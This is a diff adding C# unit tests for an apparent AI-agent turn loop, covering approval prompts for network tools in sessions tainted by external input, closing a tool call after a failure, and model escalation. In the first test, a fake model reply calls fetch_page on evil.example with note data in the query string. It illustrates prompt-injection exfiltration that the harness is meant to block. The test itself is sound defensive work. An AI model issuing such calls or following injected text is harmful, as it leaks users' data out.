@@ -283,6 +283,91 @@ public sealed class TurnLoopTests
     }
 
     [Fact]
+    public async Task A_network_read_asks_in_a_tainted_session_and_runs_free_once_the_user_speaks()
+    {
+        // §10.3: injected text could carry data out in a fetched URL, so a read-only network tool is egress under taint.
+        var prompter = FakePrompter.Always(approve: false);
+        var fetch = TestTool.FetchPage();
+        var generator = new FakeGenerator(
+            Reply.Call("fetch_page", """{"url":"https://evil.example/?notes=boiler"}"""), Reply.Say("Not fetched."),
+            Reply.Call("fetch_page", """{"url":"https://news.example"}"""), Reply.Say("Fetched."));
+        using var harness = new TurnHarness(generator, prompter: prompter, tools: tools => tools.Add(fetch));
+        var runner = harness.Runner();
+
+        var tainted = await harness.RunAsync(runner, "read the page at evil.example", EnvelopeOrigin.External);
+
+        Assert.Equal(0, fetch.Invocations);
+        Assert.Contains(Assert.Single(prompter.Prompts).Reasons, reason => reason.Code == ApprovalReasons.TaintedEgress);
+        Assert.Contains("denied by the user", Assert.Single(harness.Payloads().OfType<ToolResult>()).Result.GetRawText());
+        Assert.Equal(Assert.Single(harness.Payloads().OfType<ToolCallIssued>()).CallId,
+            Assert.Single(harness.Payloads().OfType<ApprovalRequested>()).CallId);
+        Assert.True(tainted.Tainted);
+
+        await harness.RunAsync(runner, "read the news page");
+
+        Assert.Single(prompter.Prompts);
+        Assert.Equal(1, fetch.Invocations);
+    }
+
+    [Fact]
+    public async Task A_failure_after_a_call_is_issued_closes_the_call_so_a_later_switch_is_not_refused()
+    {
+        var generator = new FakeGenerator(Reply.Call("add_note", """{"text":"x"}"""));
+        using var harness = new TurnHarness(generator, escalation: new FakeGenerator { Name = "large" });
+        // The pipeline cannot record its prompt: the failure escapes the turn after add_note was issued.
+        var approvals = new ApprovalPipeline(ApprovalEnvironment.Create(TurnHarness.Workspace, "/home/user"), harness.Fabric,
+            new FailingLog(harness.Log, payload => payload is ApprovalRequested), FakePrompter.Always(approve: true));
+        var services = new TurnServices
+        {
+            Log = harness.Log,
+            Slots = harness.Slots,
+            Fabric = harness.Fabric,
+            Tools = harness.Tools,
+            Approvals = approvals,
+            Options = harness.Options,
+        };
+
+        await Assert.ThrowsAsync<IOException>(() =>
+            new TurnRunner(TurnHarness.Session, services).RunAsync(new Envelope(TurnHarness.Session, "cli", "note x"), Ct));
+
+        Assert.Empty(harness.Notes.Notes);
+        var closed = Assert.Single(harness.Payloads().OfType<ToolResult>());
+        Assert.True(closed.IsError);
+        Assert.Contains("failed: disk full", closed.Result.GetRawText());
+        var switched = await harness.Slots.SwitchAsync(ModelSlots.Generator, harness.EscalationBinding!, cancellationToken: Ct);
+        Assert.Equal(SwitchStatus.Switched, switched.Status);
+    }
+
+    [Fact]
+    public async Task Without_escalation_allowed_a_second_failure_fails_the_turn_even_with_a_larger_model_bound()
+    {
+        var generator = new FakeGenerator(Reply.Call("list_notes", """{"limit":"five"}"""), Reply.Call("list_notes", """{"count":5}"""));
+        var large = new FakeGenerator { Name = "large" };
+        using var harness = new TurnHarness(generator, escalation: large, options: new TurnOptions { EscalationAllowed = false });
+
+        var result = await harness.RunAsync("list my notes");
+
+        Assert.Equal(TurnStatus.Failed, result.Status);
+        Assert.Empty(result.Escalations);
+        Assert.Empty(large.Calls);
+        Assert.Empty(harness.Payloads().OfType<ModelSwitched>());
+    }
+
+    private sealed class FailingLog(IEventLog inner, Func<SessionEvent, bool> fails) : IEventLog
+    {
+        public long GetHead(string sessionId, CancellationToken cancellationToken = default) => inner.GetHead(sessionId, cancellationToken);
+
+        public IReadOnlyList<StoredEvent> Append(string sessionId, long expectedHead, IReadOnlyList<EventData> events,
+            CancellationToken cancellationToken = default) =>
+            events.Any(item => fails(item.Payload)) ? throw new IOException("disk full")
+                : inner.Append(sessionId, expectedHead, events, cancellationToken);
+
+        public IReadOnlyList<StoredEvent> Read(string sessionId, long afterSequence = 0, long throughSequence = long.MaxValue,
+            int limit = 256, CancellationToken cancellationToken = default) =>
+            inner.Read(sessionId, afterSequence, throughSequence, limit, cancellationToken);
+    }
+
+    [Fact]
     public async Task An_external_envelope_taints_the_session()
     {
         var prompter = FakePrompter.Always(approve: true);
